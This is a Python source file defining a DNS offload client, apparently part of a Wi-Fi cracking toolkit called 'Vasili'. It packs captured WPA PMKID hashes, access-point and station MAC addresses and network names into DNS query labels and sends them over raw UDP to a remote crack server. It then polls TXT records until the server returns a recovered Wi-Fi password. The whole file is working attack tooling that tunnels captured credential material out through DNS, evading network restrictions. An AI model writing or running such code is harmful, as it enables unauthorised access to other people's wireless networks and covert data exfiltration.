"""DNS offload client — submit PMKID hashes via DNS and poll for results.

Encodes data in DNS subdomain labels and sends raw UDP queries to the
Vasili crack server.  No full internet connection needed — only DNS
reachability on port 53.

Protocol:
  Submit (A query):
    <pmkid>.<mac_ap>.<mac_sta>.<essid>.submit.<secret>.<domain>
    Response: 1.0.0.1 = accepted

  Poll (TXT query):
    <job_id>.status.<secret>.<domain>
    Response TXT: "queued" | "working <pct>" | "found <pw>" | "exhausted"
"""

import socket
import struct
import time

from logging_config import get_logger

logger = get_logger(__name__)


class DnsOffloadClient:
    """Send PMKID data over DNS and poll for cracking results."""

    def __init__(self, domain: str, secret: str, nameserver: str,
                 source_ip: str | None = None, timeout: float = 5.0):
        self.domain = domain.rstrip('.')
        self.secret = secret[:8] if len(secret) > 8 else secret
        self.nameserver = nameserver.split(':')[0]  # strip port if present
        self.ns_port = 53
        self.source_ip = source_ip
        self.timeout = timeout
        self._txn_counter = 0

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def submit_pmkid(self, pmkid_hex: str, mac_ap: str, mac_sta: str,
                     essid_hex: str) -> str | None:
        """Submit a PMKID job via DNS A query. Returns job_id or None."""
        # Build the query domain:
        # <pmkid>.<mac_ap>.<mac_sta>.<essid>.submit.<secret>.<domain>
        qname = (
            f'{pmkid_hex}.{mac_ap}.{mac_sta}.{essid_hex}'
            f'.submit.{self.secret}.{self.domain}'
        )

        logger.info('Submitting PMKID job via DNS: %s...', pmkid_hex[:16])

        resp = self._send_query(qname, qtype=1)  # A record
        if not resp:
            logger.warning('No DNS response for submit query')
            return None

        ip = self._parse_a_response(resp)
        if ip == '1.0.0.1':
            job_id = pmkid_hex[:8]
            logger.info('Job accepted: %s', job_id)
            return job_id
        else:
            logger.warning('Job rejected (response: %s)', ip)
            return None

    def poll_status(self, job_id: str) -> dict:
        """Poll for job status via DNS TXT query.

        Returns dict with keys: status, password (if found), progress.
        """
        qname = f'{job_id}.status.{self.secret}.{self.domain}'

        resp = self._send_query(qname, qtype=16)  # TXT record
        if not resp:
            return {'status': 'error', 'password': None, 'progress': 0}

        txt = self._parse_txt_response(resp)
        if not txt:
            return {'status': 'error', 'password': None, 'progress': 0}

        return self._parse_status_text(txt)

    # ------------------------------------------------------------------
    # DNS wire format
    # ------------------------------------------------------------------

    def _next_txn_id(self) -> int:
        self._txn_counter = (self._txn_counter + 1) & 0xFFFF
        return self._txn_counter

    def _build_dns_query(self, qname: str, qtype: int = 1) -> bytes:
        """Build a DNS query packet in wire format.

        Args:
            qname: Fully qualified domain name (e.g. "foo.bar.example.com")
            qtype: Query type (1=A, 16=TXT)
        """
        txn_id = self._next_txn_id()
        # Header
        header = struct.pack('!HHHHHH',
                             txn_id,
                             0x0100,  # flags: standard query, recursion desired
                             1, 0, 0, 0)  # QD=1, AN=0, NS=0, AR=0

        # Encode QNAME
        qname_bytes = b''
        for label in qname.split('.'):
            if not label:
                continue
            encoded = label.encode('ascii')
            if len(encoded) > 63:
                # Truncate oversized labels
                encoded = encoded[:63]
            qname_bytes += struct.pack('!B', len(encoded)) + encoded
        qname_bytes += b'\x00'  # root terminator

        # QTYPE and QCLASS
        question = qname_bytes + struct.pack('!HH', qtype, 1)  # class IN

        return header + question

    def _send_query(self, qname: str, qtype: int = 1) -> bytes | None:
        """Send a DNS query and return the raw response, or None."""
        query = self._build_dns_query(qname, qtype)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.timeout)
        try:
            if self.source_ip:
                sock.bind((self.source_ip, 0))
            sock.sendto(query, (self.nameserver, self.ns_port))
            data, _ = sock.recvfrom(4096)
            return data
        except socket.timeout:
            logger.debug('DNS query timed out for %s', qname[:60])
            return None
        except Exception as exc:
            logger.debug('DNS query error: %s', exc)
            return None
        finally:
            sock.close()

    # ------------------------------------------------------------------
    # Response parsing
    # ------------------------------------------------------------------

    def _parse_a_response(self, data: bytes) -> str | None:
        """Extract the first A record IP from a DNS response."""
        if len(data) < 12:
            return None

        ancount = struct.unpack('!H', data[6:8])[0]
        if ancount == 0:
            return None

        # Skip header (12) and question section
        offset = 12
        # Skip QNAME
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if length & 0xC0:
                offset += 2
                break
            offset += 1 + length
        offset += 4  # QTYPE + QCLASS

        # Parse first answer
        if offset >= len(data):
            return None
        # Skip answer NAME (could be pointer)
        if data[offset] & 0xC0:
            offset += 2
        else:
            while offset < len(data) and data[offset] != 0:
                offset += 1 + data[offset]
            offset += 1

        if offset + 10 > len(data):
            return None
        rtype = struct.unpack('!H', data[offset:offset + 2])[0]
        offset += 8  # skip TYPE, CLASS, TTL
        rdlen = struct.unpack('!H', data[offset:offset + 2])[0]
        offset += 2

        if rtype == 1 and rdlen == 4 and offset + 4 <= len(data):
            return '.'.join(str(b) for b in data[offset:offset + 4])
        return None

    def _parse_txt_response(self, data: bytes) -> str | None:
        """Extract the first TXT record string from a DNS response."""
        if len(data) < 12:
            return None

        ancount = struct.unpack('!H', data[6:8])[0]
        if ancount == 0:
            return None

        # Skip header + question
        offset = 12
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if length & 0xC0:
                offset += 2
                break
            offset += 1 + length
        offset += 4  # QTYPE + QCLASS

        # Parse first answer
        if offset >= len(data):
            return None
        if data[offset] & 0xC0:
            offset += 2
        else:
            while offset < len(data) and data[offset] != 0:
                offset += 1 + data[offset]
            offset += 1

        if offset + 10 > len(data):
            return None
        rtype = struct.unpack('!H', data[offset:offset + 2])[0]
        offset += 8  # TYPE, CLASS, TTL
        rdlen = struct.unpack('!H', data[offset:offset + 2])[0]
        offset += 2

        if rtype == 16 and rdlen > 1 and offset + rdlen <= len(data):
            txt_len = data[offset]
            offset += 1
            return data[offset:offset + txt_len].decode('utf-8', errors='replace')
        return None

    @staticmethod
    def _parse_status_text(txt: str) -> dict:
        """Parse a status TXT record into a structured dict."""
        if txt.startswith('found '):
            return {
                'status': 'found',
                'password': txt[6:],
                'progress': 100,
            }
        elif txt.startswith('working'):
            pct = 0
            parts = txt.split()
            if len(parts) >= 2:
                try:
                    pct = int(parts[1])
                except ValueError:
                    pass
            return {'status': 'working', 'password': None, 'progress': pct}
        else:
            return {'status': txt, 'password': None, 'progress': 0}
